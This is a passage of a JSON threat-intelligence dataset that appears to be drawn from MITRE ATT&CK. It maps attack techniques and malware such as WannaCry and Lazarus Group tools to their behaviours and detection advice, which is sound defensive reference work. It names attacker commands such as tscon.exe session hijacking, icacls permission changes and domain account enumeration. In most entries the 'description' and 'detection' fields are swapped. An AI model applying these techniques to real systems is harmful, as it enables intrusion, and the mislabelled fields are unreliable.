                "description": [],
                "detection": "No Description Available Yet",
                "is_subtype": false,
                "platforms": []
            }
        },
        {
            "id": "T1055",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Process Injection",
                "chain_phase": "defense-evasion",
                "description": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017) \n\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \n\nMonitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) \n\nMonitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules.(Citation: Microsoft Sysmon v6 May 2017) \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",
                "detection": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1043",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Commonly Used Port",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "detection": "**This technique has been deprecated. Please use Non-Standard Port where appropriate.**\n\nAdversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as\n\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol. \n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are \n\n* TCP/UDP:135 (RPC)\n* TCP/UDP:22 (SSH)\n* TCP/UDP:3389 (RDP)",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0376",
            "type": "tool",
            "attributes": {
                "name": "HOPLIGHT",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "HOPLIGHT is a backdoor Trojan that has reportedly been used by the North Korean government.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1132.001": "Standard Encoding",
                    "T1571": "Non-Standard Port",
                    "T1569.002": "Service Execution",
                    "T1059.003": "Windows Command Shell",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1003.002": "Security Account Manager",
                    "T1550.002": "Pass the Hash",
                    "T1124": "System Time Discovery",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1065": "Uncommonly Used Port",
                    "T1055": "Process Injection",
                    "T1047": "Windows Management Instrumentation",
                    "T1043": "Commonly Used Port",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1012": "Query Registry",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 20
        },
        {
            "id": "T1090.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Multi-hop Proxy",
                "chain_phase": "command-and-control",
                "description": "When observing use of Multi-hop proxies, network data from the actual command and control servers could allow correlating incoming and outgoing flows to trace malicious traffic back to its source. Multi-hop proxies can also be detected by alerting on traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)) or known adversary infrastructure that uses this technique.\n\nIn context of network devices, monitor traffic for encrypted communications from the Internet that is addressed to border routers.  Compare this traffic with the configuration to determine whether it matches with any configured site-to-site Virtual Private Network (VPN) connections the device was intended to have. Monitor traffic for encrypted communications originating from potentially breached routers that is addressed to other routers within the organization.  Compare the source and destination with the configuration of the device to determine if these channels are an authorized Virtual Private Network (VPN) connections or other encrypted modes of communication. Monitor ICMP traffic from the Internet that is addressed to border routers and is encrypted.  Few if any legitimate use cases exist for sending encrypted data to a network device via ICMP.",
                "detection": "To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network. \n\nIn the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.  By leveraging Patch System Image, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes.  This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network.  This method is dependent upon the Network Boundary Bridging method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s WAN. Protocols such as ICMP may be used as a transport.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ]
            }
        },
        {
            "id": "T1563.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "RDP Hijacking",
                "chain_phase": "lateral-movement",
                "description": "Consider monitoring processes for `tscon.exe` usage and monitor service creation that uses `cmd.exe /k` or `cmd.exe /c` in its arguments to detect RDP session hijacking.\n\nUse of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP.",
                "detection": "Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).\n\nAdversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\\windows\\system32\\tscon.exe session number to be stolen`, an adversary can hijack a session without the need for credentials or prompts to the user. This can be done remotely or locally and with active or disconnected sessions. It can also lead to Remote System Discovery and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1222.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Windows File and Directory Permissions Modification",
                "chain_phase": "defense-evasion",
                "description": "Monitor and investigate attempts to modify DACLs and file/directory ownership. Many of the commands used to modify DACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\n\nConsider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.(Citation: EventTracker File Permissions Feb 2014)",
                "detection": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs). Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, PowerShell provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0366",
            "type": "tool",
            "attributes": {
                "name": "WannaCry",
                "aliases": [
                    "WanaCry",
                    "WanaCrypt",
                    "WanaCrypt0r",
                    "WCry"
                ],
                "labels": [
                    "malware"
                ],
                "description": "WannaCry is ransomware that was first seen in a global attack during May 2017, which affected more than 150 countries. It contains worm-like features to spread itself across a computer network using the SMBv1 exploit EternalBlue.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1090.003": "Multi-hop Proxy",
                    "T1570": "Lateral Tool Transfer",
                    "T1564.001": "Hidden Files and Directories",
                    "T1563.002": "RDP Hijacking",
                    "T1222.001": "Windows File and Directory Permissions Modification",
                    "T1543.003": "Windows Service",
                    "T1490": "Inhibit System Recovery",
                    "T1489": "Service Stop",
                    "T1486": "Data Encrypted for Impact",
                    "T1210": "Exploitation of Remote Services",
                    "T1120": "Peripheral Device Discovery",
                    "T1083": "File and Directory Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T0866": "Exploitation of Remote Services",
                    "T0822": "External Remote Services",
                    "T0867": "Lateral Tool Transfer"
                }
            },
            "val": 19
        },
        {
            "id": "T1561.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Disk Structure Wipe",
                "chain_phase": "impact",
                "description": "Look for attempts to read/write to sensitive locations like the master boot record and the disk partition table. Monitor for direct access read/write attempts using the <code>\\\\\\\\.\\\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.",
                "detection": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table. The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. Disk Structure Wipe may be performed in isolation, or along with Disk Content Wipe if all sectors of a disk are wiped.\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1561.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Disk Content Wipe",
                "chain_phase": "impact",
                "description": "Look for attempts to read/write to sensitive locations like the partition boot sector or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the <code>\\\\\\\\.\\\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.",
                "detection": "Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.\n\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface. Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data. Adversaries have been observed leveraging third-party drivers like RawDisk to directly access disk content. This behavior is distinct from Data Destruction because sections of the disk are erased instead of individual files.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0364",
            "type": "tool",
            "attributes": {
                "name": "RawDisk",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "RawDisk is a legitimate commercial driver from the EldoS Corporation that is used for interacting with files, disks, and partitions. The driver allows for direct modification of data on a local computer's hard drive. In some cases, the tool can enact these raw disk modifications from user-mode processes, circumventing Windows operating system security features.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1561.002": "Disk Structure Wipe",
                    "T1561.001": "Disk Content Wipe",
                    "T1485": "Data Destruction"
                }
            },
            "val": 3
        },
        {
            "id": "S0347",
            "type": "tool",
            "attributes": {
                "name": "AuditCred",
                "aliases": [
                    "Roptimizer"
                ],
                "labels": [
                    "malware"
                ],
                "description": "AuditCred is a malicious DLL that has been used by Lazarus Group during their 2018 attacks.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1070.004": "File Deletion",
                    "T1543.003": "Windows Service",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1055": "Process Injection",
                    "T1043": "Commonly Used Port",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 10
        },
        {
            "id": "S0245",
            "type": "tool",
            "attributes": {
                "name": "BADCALL",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "BADCALL is a Trojan malware variant used by the group Lazarus Group.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1001.003": "Protocol Impersonation",
                    "T1571": "Non-Standard Port",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1112": "Modify Registry",
                    "T1090": "Proxy",
                    "T1082": "System Information Discovery",
                    "T1043": "Commonly Used Port",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 9
        },
        {
            "id": "S0246",
            "type": "tool",
            "attributes": {
                "name": "HARDRAIN",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "HARDRAIN is a Trojan malware variant reportedly used by the North Korean government.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1001.003": "Protocol Impersonation",
                    "T1571": "Non-Standard Port",
                    "T1059.003": "Windows Command Shell",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1090": "Proxy",
                    "T1043": "Commonly Used Port"
                }
            },
            "val": 6
        },
        {
            "id": "S0241",
            "type": "tool",
            "attributes": {
                "name": "RATANKBA",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "RATANKBA is a remote controller tool used by Lazarus Group. RATANKBA has been used in attacks targeting financial institutions in Poland, Mexico, Uruguay, the United Kingdom, and Chile. It was also seen used against organizations related to telecommunications, management consulting, information technology, insurance, aviation, and education. RATANKBA has a graphical user interface to allow the attacker to issue jobs to perform on the infected machines.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1087.001": "Local Account",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1043": "Commonly Used Port",
                    "T1033": "System Owner/User Discovery",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 16
        },
        {
            "id": "T1132.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Non-Standard Encoding",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1087.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Domain Account",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n",
                "detection": "Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the Net utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1134.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Create Process with Token",
                "chain_phase": "defense-evasion",
                "description": "If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.\n\nAnalysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)</code> and <code>CreateProcessWithTokenW</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",
                "detection": "Adversaries may create a new process with a duplicated token to escalate privileges and bypass access controls. An adversary can duplicate a desired access token with <code>DuplicateToken(Ex)</code> and use it with <code>CreateProcessWithTokenW</code> to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1203",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exploitation for Client Execution",
                "chain_phase": "execution",
                "description": "Detecting software exploitation may be difficult depending on the tools available. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the browser or Office processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.",
                "detection": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1119",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Automated Collection",
                "chain_phase": "collection",
                "description": "Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as [Data Staged](https://attack.mitre.org/techniques/T1074). As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0239",
            "type": "tool",
            "attributes": {
                "name": "Bankshot",
                "aliases": [
                    "Trojan Manuscript"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Bankshot is a remote access tool (RAT) that was first reported by the Department of Homeland Security in December of 2017. In 2018, Lazarus Group used the Bankshot implant in attacks against the Turkish financial sector.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1001.003": "Protocol Impersonation",
                    "T1132.002": "Non-Standard Encoding",
                    "T1571": "Non-Standard Port",
                    "T1059.003": "Windows Command Shell",
                    "T1087.002": "Domain Account",
                    "T1087.001": "Local Account",
                    "T1134.002": "Create Process with Token",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1543.003": "Windows Service",
                    "T1203": "Exploitation for Client Execution",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1119": "Automated Collection",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1070": "Indicator Removal on Host",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1012": "Query Registry",
                    "T1005": "Data from Local System"
                }
            },
            "val": 25
        },
        {
            "id": "S0271",
            "type": "tool",
            "attributes": {
                "name": "KEYMARBLE",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "KEYMARBLE is a Trojan that has reportedly been used by the North Korean government.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1059.003": "Windows Command Shell",
                    "T1070.004": "File Deletion",
                    "T1113": "Screen Capture",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1043": "Commonly Used Port",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 11
        },
        {
            "id": "S0238",
            "type": "tool",
            "attributes": {
                "name": "Proxysvc",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Proxysvc is a malicious DLL used by Lazarus Group in a campaign known as Operation GhostSecret. It has appeared to be operating undetected since 2017 and was mostly observed in higher education organizations. The goal of Proxysvc is to deliver additional payloads to the target and to maintain control for the attacker. It is in the form of a DLL that can also be executed as a standalone process.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1569.002": "Service Execution",
                    "T1059.003": "Windows Command Shell",
                    "T1070.004": "File Deletion",
                    "T1485": "Data Destruction",
                    "T1124": "System Time Discovery",
                    "T1119": "Automated Collection",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1043": "Commonly Used Port",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1005": "Data from Local System"
                }
            },
            "val": 15
        },
        {
            "id": "T1094",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Custom Command and Control Protocol",
                "chain_phase": null,
                "description": [],
                "detection": "No Description Available Yet",
                "is_subtype": false,
                "platforms": []
            }
        },
        {
            "id": "S0263",
            "type": "tool",
            "attributes": {
                "name": "TYPEFRAME",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "TYPEFRAME is a remote access tool that has been used by Lazarus Group.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1571": "Non-Standard Port",
                    "T1204.002": "Malicious File",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1070.004": "File Deletion",
                    "T1543.003": "Windows Service",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1065": "Uncommonly Used Port",
                    "T1043": "Commonly Used Port",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 17
        },
        {
            "id": "S0180",
            "type": "tool",
            "attributes": {
                "name": "Volgmer",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Volgmer is a backdoor Trojan designed to provide covert access to a compromised system. It has been used since at least 2013 to target the government, financial, automotive, and media industries. Its primary delivery mechanism is suspected to be spearphishing.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1573.001": "Symmetric Cryptography",
                    "T1059.003": "Windows Command Shell",
                    "T1036.004": "Masquerade Task or Service",
                    "T1070.004": "File Deletion",
                    "T1543.003": "Windows Service",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1043": "Commonly Used Port",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 21
        },
        {
            "id": "S0181",
            "type": "tool",
            "attributes": {
                "name": "FALLCHILL",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "FALLCHILL is a RAT that has been used by Lazarus Group since at least 2016 to target the aerospace, telecommunications, and finance industries. It is usually dropped by other Lazarus Group malware or delivered when a victim unknowingly visits a compromised website.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1001.003": "Protocol Impersonation",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1543.003": "Windows Service",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 8
        },
        {
            "id": "T1546.007",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Netsh Helper DLL",
                "chain_phase": "privilege-escalation",
                "description": "It is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code> registry key for any new or suspicious entries that do not correlate with known system files or benign software. (Citation: Demaske Netsh Persistence)",
                "detection": "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.  The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.\n\nAdversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0108",
            "type": "tool",
            "attributes": {
                "name": "netsh",
                "aliases": [
                    "netsh.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "netsh is a scripting utility used to interact with networking components on local or remote systems.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1518.001": "Security Software Discovery",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1546.007": "Netsh Helper DLL",
                    "T1090": "Proxy"
                }
            },
            "val": 4
        },
        {
            "id": "G0020",
            "type": "group",
            "attributes": {
                "val": 0,
                "name": "Equation",
                "aliases": [],
                "description": "Equation is a sophisticated threat group that employs multiple remote access tools. The group is known to use zero-day exploits and has developed the capability to overwrite the firmware of hard disk drives.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": [],
                "techniques": {
                    "T1564.005": "Hidden File System",
                    "T1480.001": "Environmental Keying",
                    "T1542.002": "Component Firmware",
